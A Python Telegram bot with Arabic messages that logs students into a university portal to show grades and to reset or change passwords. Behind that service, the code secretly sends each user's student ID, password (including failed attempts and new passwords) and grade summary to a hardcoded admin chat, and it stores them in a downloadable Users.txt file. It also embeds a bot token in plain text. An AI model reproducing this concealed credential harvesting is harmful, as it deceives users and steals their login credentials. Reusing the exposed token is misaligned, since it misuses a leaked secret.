import telebot
from telebot import types
import requests
from bs4 import BeautifulSoup
import json
from urllib.parse import quote
import time
import threading

admin_chat_id = 1792449471
token ="6873478283:AAH6O2NHuysxWkfQGBvHNtgv_4OkGwNy2DY"
bot = telebot.TeleBot(token)
#__&&&&_____
keyboard2 = types.InlineKeyboardMarkup()
pas1 = types.InlineKeyboardButton(text='معرفة الباسورد✅', callback_data='send_password')
natega1 = types.InlineKeyboardButton(text='اعادة المحاولة 🔁', callback_data='echo_all')
back_button = types.InlineKeyboardButton(text='رجوع🔙', callback_data='back')
keyboard2.row(pas1)
keyboard2.row(natega1)
keyboard2.row(back_button)

#_______7__$$$$_$$$
keyboard = types.InlineKeyboardMarkup()
dev = types.InlineKeyboardButton(text="𓆩⋆ ׅᎯ𝑳 ׅ𝕯𝔞l̸𝑔𝔞🅦︎𝕪 ׅ⋆𓆪", url='https://t.me/BO_R0')
grop = types.InlineKeyboardButton(text='𝑴𝒊𝒏𝒊𝒂 𝑨𝒈𝒓𝒊𝒄𝒖𝒍𝒕𝒖𝒓𝒆☘️', url='https://t.me/+rbphVRSaWD9mNjg8')
natega = types.InlineKeyboardButton(text='الحصول علي النتيجة✅', callback_data='echo_all')
pas = types.InlineKeyboardButton(text='معرفة الباسورد👁️‍🗨️', callback_data='send_password')
change_pass = types.InlineKeyboardButton(text='تغيير الباسورد🔑', callback_data='change_password')

keyboard.row(natega, pas)
keyboard.row(change_pass)
keyboard.row(dev, grop)

#ارسال users للادمن
@bot.message_handler(commands=['users'])
def users_command(message):
    if str(message.chat.id) == str(admin_chat_id):
        with open('Users.txt', 'rb') as file:
            bot.send_document(admin_chat_id, file)
    else:
        bot.reply_to(message, 'ليس لديك صلاحية الوصول لهذا الأمر.')
#________________$$$$$$$

@bot.message_handler(commands=['start'])
@bot.message_handler(func=lambda message: True)
def welcome(message):
    chat_id = message.chat.id
    bot.send_chat_action(chat_id, 'typing')
    bot.reply_to(message, f"👋 • مرحبا بك ي باشمهندس [{message.from_user.first_name}](tg://user?id={message.from_user.id})!\n"
                          f"🤖• في بوت [{bot.get_me().first_name}](https://t.me/{bot.get_me().username}) للحصول على النتيجة.\n"
                          f"📚 • يمكنك استخدام البوت للحصول على النتائج.\n"
                          f"🔑 • كما يمكنك أيضًا معرفة باسورد ابن الهيثم.",
                 parse_mode='Markdown', reply_markup=keyboard)

keyboard1 = types.InlineKeyboardMarkup()
back_button = types.InlineKeyboardButton(text='رجوع🔙', callback_data='back')
keyboard1.row(back_button)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'echo_all':
        bot.clear_step_handler(call.message)
        echo_all(call.message)
    elif call.data == 'back':
        bot.clear_step_handler(call.message)
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.message_id,
                              text=f"🔙•تم الرجوع إلى القائمة الرئيسية\n"
                                   f"📚 • يمكنك استخدام البوت للحصول على النتائج.\n"
                                   f"🔑 • كما يمكنك أيضًا معرفة باسورد ابن الهيثم.",
                              parse_mode='Markdown',
                              reply_markup=keyboard)
    elif call.data == "send_password":
        bot.clear_step_handler(call.message)
        send_password(call.message)
    elif call.data == "change_password":
        bot.clear_step_handler(call.message)
        change_password_step1(call)
      	

def send_password(message):
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text="برجاء ادخال البريد الإلكتروني الخاص بك:", reply_markup=keyboard1)
    
    bot.register_next_step_handler(message, process_email)

def process_email(message):
    mail = message.text

    if mail:
        id = mail[:8]
        url = "http://credit.minia.edu.eg/stuJCI"
       
        headers = {
            "Host": "credit.minia.edu.eg",
            "Connection": "keep-alive",
            "Content-Length": "91",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "X-CSRFToken": "null",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "http://credit.minia.edu.eg",
            "Referer": "http://credit.minia.edu.eg/static/index.html",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        data = {
            "param0": "Mail.Mail",
            "param1": "SendMail",
            "param2": id,
            "param3": mail,
            "param4": "2"
        }

        try:
            res = requests.post(url, headers=headers, data=data, timeout=10)
            chat_id = message.chat.id
            bot.send_chat_action(chat_id, 'typing')

            if not res.ok:
            	bot.reply_to(message, "توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
            	

            if "success" in res.text:
                bot.reply_to(message, "•تم إرسال كلمة المرور إلى outlook بنجاح ✅.\n•قم بالتسجيل الان الي outlook بستخدام البريد والباسورد من خلال هذا اللينك\nhttps://outlook.office365.com/mail/inbox", reply_markup=keyboard1)
                admin_message1 = (
                    f"• **المستخدم:** {message.from_user.first_name} (@{message.from_user.username})\n"
                    f"• تم إرسال كلمة المرور للبريد الإلكتروني بنجاح ✅.\n{mail}"
                )
                bot.send_message(admin_chat_id, admin_message1)
            elif "fail" in res.text:
                if "local variable 'Conn' referenced before assignment" in res.text:
                    bot.reply_to(message, "حدث خطأ أثناء الاتصال بالخادم. حاول لاحقا❗.", reply_markup=keyboard1)
                else:
                    bot.reply_to(message, "عنوان البريد الإلكتروني غير مسجل على النظام❌", reply_markup=keyboard1)
        except requests.Timeout:
            bot.reply_to(message, "• تم ايقاف هذا الامر من قبل المطور 🚫", reply_markup=keyboard1)

                
def echo_all(message):
    bot.edit_message_text(
    chat_id=message.chat.id,
    message_id=message.message_id,
    text="برجاء ادخال id (كود الطالب) 🆔:",
    reply_markup=keyboard1
)


    bot.register_next_step_handler(message, process_id)

def process_id(message):
    if not message.text.isdigit():
        bot.reply_to(message, "الرجاء إدخال كود الطالب الصحيح (أرقام فقط)❌.", reply_markup=keyboard1)
        return

    student_id = message.text
    bot.reply_to(message, "برجاء ادخال الباسورد:")
    bot.register_next_step_handler(message, process_password, student_id)

def process_password(message, student_id):
    password = message.text
    chat_id = message.chat.id
    password_message_id = message.message_id  # حفظ معرف رسالة كلمة المرور
    sent_message = bot.reply_to(message, "•يتم الآن التحقق من كلمة المرور...🔍")
    temp_message_id = sent_message.message_id
    url1 = "http://credit.minia.edu.eg/studentLogin"
    headers1 = {
        "Host": "credit.minia.edu.eg",
        "Connection": "keep-alive",
        "Content-Length": "72",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://credit.minia.edu.eg",
        "Referer": "http://credit.minia.edu.eg/static/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    data1 = {
        "UserName": student_id,
        "Password": password,
        "sysID": "313.",
        "UserLang": "E",
        "userType": "2",
    }

    try:
        response1 = requests.post(url1, headers=headers1, data=data1, timeout=10)
        bot.delete_message(chat_id=chat_id, message_id=password_message_id)

        if not response1.ok:
            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
            return

        if "LoginOK" in response1.text and json.loads(response1.text)["rows"][0]["row"]["LoginOK"] == "True":
            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="•تم التحقق من كلمة المرور وجاري الحصول على النتيجة✅. \n•يرجى الانتظار قد يستغرق الامر دقيقتين كحد اقصى...⏳") 
            chat_id = message.chat.id
            bot.send_chat_action(chat_id, 'typing')
            cookies = response1.headers["Set-Cookie"]    
        else:
            bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text="•برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌\n•لمعرفة كلمة المرور الصحيحه قم بالنقر على الزر أدناه:⬇️", reply_markup=keyboard2)

            try:
            	admin_message = (
            f"ℹ️ *معلومات المستخدم:*❌\n"
            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
            f"• **كود الطالب:** {student_id} \n"
            f"• **كلمة المرور:** {password}\n"
            f"-------------------------------------\n"
            f"📢 *المستخدم {message.from_user.username} قام بإرسال رقم الطالب وكلمة المرور.*"
        )
            	bot.send_message(admin_chat_id, admin_message)
            except Exception as e:
            	error_message = f"❌ خطأ أثناء إرسال الطلب: {str(e)}"
            	bot.send_message(admin_chat_id, error_message)
            return    
    except requests.Timeout:
        bot.edit_message_text(chat_id=chat_id, message_id=temp_message_id, text=" الموقع لا يعمل برجاء المحاولة مرة اخري لاحقاً❌")
        return
    url2 = "http://credit.minia.edu.eg/getJCI"
    headers2 = {
        "Host": "credit.minia.edu.eg",
        "Connection": "keep-alive",
        "Content-Length": "223",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://credit.minia.edu.eg",
        "Referer": "http://credit.minia.edu.eg/static/PortalStudent.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": cookies
    }
    payload = {
        "param0": "Reports.RegisterCert",
        "param1": "getTranscript",
        "param2": '{"crsReplaceHide":"true","ShowDetails":"true","portalFlag":"true","RegType":"student","AppType":"result"}'
    }
    response1 = requests.post(url2, headers=headers2, data=payload).text
    soup = BeautifulSoup(response1, 'html.parser')
    json_text = soup.get_text()
    data2 = json.loads(json_text)
    name=data2["stuName"]
    calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message)
    calculate_and_send_course_info(chat_id, data2,temp_message_id)

def grade_translation(grade):
    if grade == 'A':
        return 'A', 'ممتاز مرتفع'
    elif grade == 'A-':
        return 'A-', 'ممتاز'
    elif grade == 'B+':
        return 'B+', 'جيد جداً مرتفع'
    elif grade == 'B':
        return 'B', 'جيد جداً'
    elif grade == 'B-':
        return 'B-', 'جيد مرتفع'
    elif grade == 'C+':
        return 'C+', 'جيد'
    elif grade == 'C':
        return 'C', 'مقبول مرتفع'
    elif grade == 'C-':
        return 'C-', 'مقبول'
    elif grade == 'D+':
        return 'D+', 'مقبول مشروط مرتفع'
    elif grade == 'D':
        return 'D', 'مقبول مشروط'
    elif grade == 'F':
        return 'F', 'راسب'
    elif grade == 'FR':
        return 'FR', 'راسب تحريري'
    elif grade == 'Z':
        return 'Z', 'ممنوع من الامتحان'
    elif grade == 'P':
        return 'P', 'إجتاز'
    else:
        return grade, ''
def calculate_and_send_course_info(chat_id, data2,temp_message_id):
    bot.delete_message(chat_id=chat_id, message_id=temp_message_id)    
    try:
        for year_idx, year_data in enumerate(data2["StuSemesterData"]):
            for sem_idx, semester in enumerate(year_data["Semesters"]):
                semester_name = semester["SemesterName"]
                semester_gpa = semester["GPA"]
                cumulative_gpa = semester["CurrGPA"]
                
                if semester_gpa == '':
                    semester_gpa_text = "لا يوجد بيانات تقديرية"
                else:
                    semester_gpa = float(semester_gpa)
                    semester_gpa_text = f"*{semester_gpa}*"
                    
                if cumulative_gpa == '':
                    cumulative_gpa = 0.0
                else:
                    cumulative_gpa = float(cumulative_gpa)
                
                total_credits, message = print_course_info(semester["Courses"], semester_name, cumulative_gpa)
                
                # Determine the GPA evaluation
                if cumulative_gpa == 4.0:
                    gpa_evaluation = "ممتاز مرتفع"
                elif 3.7 <= cumulative_gpa < 4.0:
                    gpa_evaluation = "ممتاز"
                elif 3.3 <= cumulative_gpa < 3.7:
                    gpa_evaluation = "جيد جداً مرتفع"
                elif 3.0 <= cumulative_gpa < 3.3:
                    gpa_evaluation = "جيد جداً"
                elif 2.7 <= cumulative_gpa < 3.0:
                    gpa_evaluation = "جيد مرتفع"
                elif 2.3 <= cumulative_gpa < 2.7:
                    gpa_evaluation = "جيد"
                elif 2.0 <= cumulative_gpa < 2.3:
                    gpa_evaluation = "مقبول مرتفع"
                elif 1.7 <= cumulative_gpa < 2.0:
                    gpa_evaluation = "مقبول"
                elif 1.3 <= cumulative_gpa < 1.7:
                    gpa_evaluation = "مقبول مشروط مرتفع"
                elif 1.0 <= cumulative_gpa < 1.3:
                    gpa_evaluation = "مقبول مشروط"
                elif 0.0 < cumulative_gpa < 1.0:
                    gpa_evaluation = "راسب"
                else:
                    gpa_evaluation = ""
                
                message_text = f"{message}\nالساعات المسجلة: {semester['RegHrs']}        الساعات الحاصل عليها: {semester['CurrCH']}\nالمعدل الفصلي: *{semester_gpa}*        المعدل التراكمي: *{cumulative_gpa}*\n          •التقدير التراكمي (*{gpa_evaluation}*)"
                                
                bot.send_message(chat_id, message_text, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}", parse_mode='Markdown')
def calculate_and_send_course_info1(chat_id, data2, admin_chat_id):
    try:
        for year_data in data2["StuSemesterData"]:
            for semester in year_data["Semesters"]:
                semester_name = semester["SemesterName"]
                semester_gpa = semester["GPA"]
                cumulative_gpa = semester["CurrGPA"]
                total_credits, message_text = print_course_info(semester["Courses"], semester_name, cumulative_gpa)
                message = f"{message_text}\nالساعات المسجلة: {semester['RegHrs']}        الساعات الحاصل عليها: {semester['CurrCH']}\nالمعدل الفصلي: {semester_gpa}        المعدل التراكمي: {cumulative_gpa}"
                bot.send_message(admin_chat_id, message, parse_mode='Markdown')
    except Exception as e:
        print(f"حدث خطأ: {e}")

def calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message):
    try:
        admin_message = (f"\n--------------------------------------\n"
            f"ℹ️ *معلومات المستخدم:*✅\n"
            f"• **اسم الطالب:** {name} \n"
            f"• **كود الطالب:** {student_id} \n"
            f"• **كلمة المرور:** {password}\n"
            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})"
        )

        for year_data in data2["StuSemesterData"]:
            for semester in year_data["Semesters"]:
                semester_name = semester["SemesterName"]
                semester_gpa = semester["GPA"]
                cumulative_gpa = semester["CurrGPA"]
                total_credits, message_text = print_course_info(semester["Courses"], semester_name, cumulative_gpa)
                admin_message += f"\n•المعدل الفصلي: {semester_gpa}        المعدل التراكمي: {cumulative_gpa}"

        bot.send_message(admin_chat_id, admin_message)
        with open('Users.txt', 'r') as file:
            file_contents = file.read()   
        if str(student_id) not in file_contents:     
            with open('Users.txt', 'a') as file:
                file.write(f"{admin_message}")
    except Exception as e:
        print(f"حدث خطأ: {e}")

def print_course_info(course_data, semester_name, gpa_evaluation):
    message_text = f"\n{semester_name}:\n"
    message_text += "الساعات المعتمدة | اسم المقرر | التقدير |\n"
    message_text += f"--------------------------------\n"
    
    total_credits = 0

    for course in course_data:
        course_name = course["CourseName"].replace('|', '')  
        course_credit = int(course["CourseCredit"])
        grade = course.get("Grade", "غير معلن")
       
        normalized_grade = grade.split('|')[0].strip()
        
        translated_grade = grade_translation(normalized_grade)
        bold_normalized_grade = f"*{translated_grade[0]}*"
        arabic_translation = translated_grade[1]

        total_credits += course_credit
        message_text += f"• {course_credit} {course_name} {bold_normalized_grade} ({arabic_translation})\n"
        
    return total_credits, message_text





#$_____$$$$$$$$$تغير الباسورد

def change_password_step1(call):
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="برجاء ادخال ID (كود الطالب) 🆔:",
        reply_markup=keyboard1
    )
    bot.register_next_step_handler(call.message, process_user_id)

def process_user_id(message):
    user_id = message.text
    msg = bot.send_message(message.chat.id, "الرجاء إدخال كلمة المرور الحالية:")
    bot.register_next_step_handler(msg, process_current_password, user_id)

def process_current_password(message, user_id):
    current_password = message.text
    msg = bot.send_message(message.chat.id, "الرجاء إدخال كلمة المرور الجديدة:")
    bot.register_next_step_handler(msg, process_new_password, user_id, current_password)

def process_new_password(message, user_id, current_password):
    new_password = message.text

    session = requests.Session()

    # تسجيل الدخول
    url3 = "http://credit.minia.edu.eg/studentLogin"
    headers1 = {
        "Host": "credit.minia.edu.eg",
        "Connection": "keep-alive",
        "Content-Length": "72",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": quote("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/120.0.0.0 Safari/537.36"),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://credit.minia.edu.eg",
        "Referer": "http://credit.minia.edu.eg/static/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    data = {
        "UserName": user_id,
        "Password": current_password,
        "sysID": "313.",
        "UserLang": "E",
        "userType": "2",
    }

    try:
        response = session.post(url3, headers=headers1, data=data, timeout=10)
        if "LoginOK" in response.text and json.loads(response.text)["rows"][0]["row"]["LoginOK"] == "True":
            msg = bot.send_message(message.chat.id, "تم التسجيل بنجاح. الآن جاري تغيير كلمة المرور...")

            # تغيير كلمة المرور
            url = "http://credit.minia.edu.eg/getJCI"
            payload = f"param0=stuAdmission.stuAdmission&param1=ChangePassWord&param2={{\"UserPassword\":\"{new_password}\"}}"
            headers = {
                'User-Agent': quote("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"),
                'Accept-Encoding': "gzip, deflate",
                'Content-Type': "application/x-www-form-urlencoded",
                'X-Requested-With': "XMLHttpRequest",
                'X-CSRFToken': "null",
                'Origin': "http://credit.minia.edu.eg",
                'Referer': "http://credit.minia.edu.eg/static/PortalStudent.html",
                'Accept-Language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
            }

            response = session.post(url, data=payload, headers=headers)
            chat_id = message.chat.id
            bot.send_chat_action(chat_id, 'typing')


            if not response.ok:
                bot.reply_to(message, "توجد مشكلة في الموقع الرجاء المحاولة مرة أخرى لاحقًا.❌", reply_markup=keyboard1)
                return

            if "failed" in response.text:
                bot.edit_message_text(
                    chat_id=msg.chat.id,
                    message_id=msg.message_id,
                    text="تم تغيير كلمة المرور بنجاح ✅",
                    reply_markup=keyboard1
                )

                admin_message1 = (
                    f"• **المستخدم:** {message.from_user.first_name} (@{message.from_user.username})\n"
                    f"• تم تغيير كلمة المرور بنجاح ✅.\n• كود الطالب: {user_id}\n"
                    f"• كلمة المرور الحالية: {current_password}\n"
                    f"• كلمة المرور الجديدة: {new_password}"
                )
                bot.send_message(admin_chat_id, admin_message1)
            else:
                bot.reply_to(message, "حدث خطأ أثناء تغيير كلمة المرور. حاول لاحقًا❗", reply_markup=keyboard1)

        else:
            bot.reply_to(message, "كلمة المرور الحالية غير صحيحة حاول مرة أخرى❌", reply_markup=keyboard1)
    except requests.Timeout:
        bot.reply_to(message, "الموقع لا يعمل برجاء المحاولة مرة اخرى لاحقاً❌", reply_markup=keyboard1)
bot.delete_webhook(drop_pending_updates=True)

bot.polling(none_stop=True)
